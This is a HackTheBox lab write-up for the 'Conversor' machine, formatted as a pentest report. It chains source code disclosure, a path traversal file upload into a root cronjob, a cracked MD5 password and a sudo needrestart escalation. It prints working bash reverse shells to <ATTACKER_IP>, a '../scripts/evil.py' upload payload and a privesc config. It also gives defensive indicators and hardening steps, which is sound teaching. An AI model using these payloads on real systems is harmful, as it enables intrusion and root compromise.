# Conversor — Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-08 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only \

---

## 0. Executive Summary

The "Conversor" machine was compromised via a chain of five vulnerabilities. Source code was publicly exposed on the web server, revealing a hardcoded Flask secret key, an unsanitized file upload path, and a root cronjob executing all Python scripts in a writable directory. A path traversal attack via the file upload allowed planting a malicious Python reverse shell in the scripts directory, yielding a shell as `www-data`. The live SQLite database contained an MD5-hashed password for user `fismathack`, which was cracked via rainbow table lookup. Finally, a sudo misconfiguration granting unrestricted `needrestart` execution was exploited to achieve root. Immediate remediation of source code exposure, file upload sanitization, and sudo permissions are recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Conversor"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Source Code Disclosure → Path Traversal File Upload → Cronjob Execution → www-data shell → SQLite MD5 Hash Crack → SSH as fismathack → sudo needrestart → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `wget` | Source code download |
| `flask-unsign` | Flask session cookie analysis |
| `sqlite3` | Database enumeration |
| `Burp Suite` | HTTP request interception & modification |
| `netcat` | Reverse shell listener |
| `hashcat` / CrackStation | MD5 hash cracking |
| GTFOBins | needrestart privesc reference |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 10.129.1.143
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu | Post-exploitation access |
| 80/tcp | HTTP | Apache httpd 2.4.52 | Redirects to conversor.htb |

**Key Observations:**
- HTTP redirects to virtual host `conversor.htb` — must add to `/etc/hosts`
- `-Pn` required — host blocking ICMP ping probes

```bash
echo "10.129.1.143 conversor.htb" | sudo tee -a /etc/hosts
```

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Commands:**
```bash
gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/login` | 200 | Login page |
| `/register` | 200 | Open registration |
| `/logout` | 302 | Confirms auth system |
| `/about` | 200 | Developer info + source code download |

### 5.2 Source Code Disclosure

The `/about` page contained a public download link for the full application source code:

```bash
wget http://conversor.htb/static/source_code.tar.gz
tar -xvf source_code.tar.gz
```

**Critical findings in source code:**

| Finding | Location | Notes |
|---------|----------|-------|
| Hardcoded Flask secret key | `app.py` | `'Changemeplease'` |
| Unsanitized filename in upload | `app.py` | Path traversal possible |
| MD5 password hashing | `app.py` | Weak, rainbow-table crackable |
| Root cronjob executing scripts | `install.md` | Runs all `.py` files in `/scripts/` |
| SQLite database included | `instance/users.db` | Dev copy — empty |

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Path traversal via unsanitized file upload filename \
**Location:** `/convert` endpoint — `app.py` \
**Reasoning:** The application saves uploaded files using the client-supplied filename directly:

```python
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
xml_file.save(xml_path)
xslt_file.save(xslt_path)
```

No sanitization is applied, allowing `../` sequences to write files outside the uploads directory. Combined with the cronjob executing all Python files in `/scripts/`, this creates a direct remote code execution path.

**Cronjob (from install.md):**
```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

### 6.2 Exploitation

An account was registered at `/register`. A malicious Python reverse shell was crafted and uploaded with a path traversal filename via Burp Suite interception.

```bash
# Listener
nc -lvnp 4444
```

The POST request to `/convert` was intercepted and the XSLT filename modified:

```
Content-Disposition: form-data; name="xslt_file"; filename="../scripts/evil.py"

import os
os.system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'")
```

The server saved the file to `/var/www/conversor.htb/scripts/evil.py`. Within 60 seconds the cronjob executed it as `www-data`.

**Result:** Reverse shell obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data` \
**To:** `fismathack`

**Method:**

The live SQLite database on the server contained hashed credentials:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

Output revealed:
```
fismathack | 5b5c3ac3a1c897c94caad48e6c71fdec
```

The MD5 hash was cracked via rainbow table lookup — password recovered: `Keepmesafeandwarm`

```bash
ssh fismathack@10.129.1.143
# password: Keepmesafeandwarm
```

**Result:** SSH access as `fismathack`. User flag located at `/home/fismathack/user.txt`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — critical finding

**Key Findings:**
```
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`fismathack` can run `needrestart` as root with no password.

### 8.2 Escalation Vector

**Vector:** sudo needrestart with malicious config file (GTFOBins) \
**Root Cause:** `needrestart` accepts a config file via `-c` flag and executes Perl code within it. Running it via sudo with no restrictions allows arbitrary root code execution.

```bash
echo 'system("bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1'\''");' > /tmp/pwn
sudo needrestart -c /tmp/pwn
```

**Result:** Root shell obtained.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Full source code publicly exposed | 🔴 Critical | `/static/source_code.tar.gz` |
| 2 | Path traversal in file upload — no filename sanitization | 🔴 Critical | `/convert` endpoint |
| 3 | Root cronjob executing www-data writable directory | 🔴 Critical | `/etc/crontab` |
| 4 | sudo needrestart with no restrictions (NOPASSWD) | 🔴 Critical | `/etc/sudoers` |
| 5 | Hardcoded Flask secret key in source code | 🟠 High | `app.py` |
| 6 | MD5 password hashing — trivially crackable | 🟠 High | `app.py` |
| 7 | Live SQLite database included in source code download | 🟠 High | `instance/users.db` |

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual filenames with `../` sequences in web server upload logs
- Outbound connections from `www-data` process to unknown IPs
- New `.py` files appearing in `/var/www/conversor.htb/scripts/`
- Unexpected processes spawned by cron as `www-data`
- `needrestart` executed with custom config file flag

### 10.2 Security Weaknesses

- Source code (including database and config) publicly downloadable
- No filename sanitization on file uploads — path traversal trivially exploitable
- Cronjob executes all files in a directory writable by web server user
- Unrestricted sudo access to a tool that executes arbitrary code
- Weak MD5 password hashing with no salt

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove source code download from public web server | Finding 1 |
| Immediate | Sanitize upload filenames — strip path separators, use UUID-based names | Finding 2 |
| Immediate | Restrict scripts directory permissions — root owned, not www-data | Finding 3 |
| Immediate | Remove needrestart from sudo or restrict with strict arguments | Finding 4 |
| Short-term | Rotate Flask secret key, never hardcode secrets in source | Finding 5 |
| Short-term | Replace MD5 with bcrypt or argon2 for password hashing | Finding 6 |
| Short-term | Never include database files in source code distributions | Finding 7 |
| Long-term | Implement file integrity monitoring on web application directories | All |

---

## 11. Lessons Learned

- **Source code disclosure is a critical vulnerability** — the entire attack chain started with downloading the source. Always check for exposed repos, backups, and downloadable archives on web servers.
- **Path traversal + cronjob = powerful combo** — neither vulnerability alone would have been sufficient. Chaining them created a clean RCE path. Always think about what runs automatically on a server.
- **Read install.md and README files** — the cronjob hint was sitting in `install.md`. Documentation files often reveal deployment details that become attack vectors.
- **MD5 is not encryption** — it's a hash, and an unsalted one is trivially crackable via rainbow tables. Any hash cracked in under 5 seconds is not protecting credentials.
- **GTFOBins for sudo privesc** — `needrestart` accepting a config file with executable Perl is a known GTFOBins vector. Recognizing sudo + unusual binary = check GTFOBins immediately.
- **Cronjob hijacking appears everywhere** — Bashed, Cronos, Conversor all used this pattern. It's one of the most common real-world privesc vectors. Always check `/etc/crontab` and writable script directories.

---

*End of Report* \
*Classification: Public — flags and sensitive values omitted*
